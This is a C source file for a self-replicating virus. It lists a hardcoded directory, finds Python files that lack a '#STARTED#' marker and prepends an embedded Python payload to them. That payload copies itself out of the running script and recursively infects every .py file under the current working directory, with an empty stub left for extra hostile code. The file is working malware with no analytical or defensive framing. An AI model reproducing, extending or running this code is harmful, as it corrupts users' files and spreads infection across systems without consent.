#include <stdio.h>
#include <string.h>

typedef char* _String;
enum { FALSE, TRUE };

#define BUFF 128

_String getVirus( void );

_Bool getExten(_String file);
_Bool getCheck(_String file);
_Bool doInject(_String file);

_Bool activate(_String root);

#define COMMAND "ls"
#define EXTEN "py"
#define QUAN 1

int main( void ) {

	_String dir[QUAN] = {
		/* "/home/user/Templates/C/TEST/", */
		/* "/home/user/Templates/C/SOME/", */
		"/home/user/Templates/C/TEST/MORE/"
	};

	for (unsigned short index = 0; 
		index < QUAN; activate(dir[index++]));

	return 0;
}

_Bool activate(_String root) {

	char fileName[BUFF];
	char pathToFile[BUFF];

	unsigned short lenFileName;

	char command[BUFF] = COMMAND;

	strcat(command, " ");
	strcat(command, root); // ls /home/user/... 

	FILE *checkDir = popen(command,"r");

	if (checkDir != NULL) {
		while (fgets(fileName, BUFF, checkDir) != NULL) {

			pathToFile[0] = '\0';
			strcat(pathToFile, root);

			lenFileName = strlen(fileName);
			fileName[lenFileName-1] = '\0';

			if (getExten(fileName) == TRUE) {
				strcat(pathToFile, fileName);
				if (getCheck(pathToFile) == FALSE) {
					doInject(pathToFile);
				}
			}
		}
		fclose(checkDir);
	} else return 1;

	return 0;
}

_Bool doInject(_String file) {

	_String virusCode = getVirus();

	long size;
	FILE *readLength = fopen(file, "r");
	if (readLength != NULL) {

		fseek(readLength, 0, SEEK_END);
    	size = ftell(readLength);

    	fclose(readLength);
	} else return 1;

	char originCode[size];
	FILE *copyCode = fopen(file, "r");
	if (copyCode != NULL) {

		fread(originCode, sizeof(char), size, copyCode);

		fclose(copyCode);
	} else return 1;

	FILE *injectCode = fopen(file,"w");
	if (injectCode != NULL) {

		fprintf(injectCode, "%s\n", virusCode);
		fprintf(injectCode, "%s\n", originCode);

		fclose(injectCode);
	} else return 1;

	return 0;
}

_Bool getCheck(_String file) {

	_Bool virusIS = FALSE;

	char buffer[BUFF];

	FILE *check = fopen(file,"r");

	if (check != NULL) {
		while (fgets(buffer, BUFF, check) != NULL)
			if (strcmp(buffer, "#STARTED#\n") == 0) {
				virusIS = TRUE;
				break;
			}
		fclose(check);
	} else return 1;

	return virusIS;
}

_Bool getExten(_String file) {

	_Bool dotIS = FALSE;
	unsigned short length = strlen(file);

	char buffer[BUFF] = {0};
	_String findExnten = EXTEN;

	unsigned short twindex = 0;
	for (unsigned short index = 0; index < length; index++) {

		if (dotIS == TRUE)
			buffer[twindex++] = file[index];

		if (file[index] == '.')
			dotIS = TRUE;

	}

	if (strcmp(buffer, findExnten) == 0)
		return TRUE;
	else return FALSE;
}

_String getVirus( void ) {

	return 

	"\n#STARTED#\n"
	"import sys, os\n"

	/* inject Code */
	"def virus(python):\n"
	"	begin = \"#STARTED#\\n\"; end = \"#STOPPED#\\n\"\n"
	"	with open(sys.argv[0]) as copy:\n"
	"		k = 0; virus_code = \"\\n\"\n"
	"		for line in copy:\n"
	"			if line == begin: k = 1; virus_code += begin\n"
	"			elif k == 1 and line != end: virus_code += line\n"
	"			elif line == end: virus_code += end; break\n"
	"			else: pass\n"
	"	with open(python) as file:\n"
	"		origin_code = \"\"\n"
	"		for line in file:\n"
	"			origin_code += line\n"
	"			if line == begin: Virus = True; break\n"
	"			else: Virus = False\n"
	"	if Virus == False:\n"
	"		with open(python,\"w\") as paste:\n"
	"			paste.write(virus_code+\"\\n\\n\"+origin_code)\n"
	"	else: pass\n"

	/* Additional Code */
	"def code(void):\n"
	"	pass\n" 
	"code(None)\n"

	/* Search Files */
	"def walk(dir):\n"
	"	for name in os.listdir(dir):\n"
	"		path = os.path.join(dir, name)\n"
	"		if os.path.isfile(path):\n"
	"			if os.path.splitext(path)[1] == \".py\":\n"
	"				virus(path)\n"
	"			else: pass\n"
	"		else: walk(path)\n"
	"walk(os.getcwd())\n"
	"#STOPPED#\n";
}
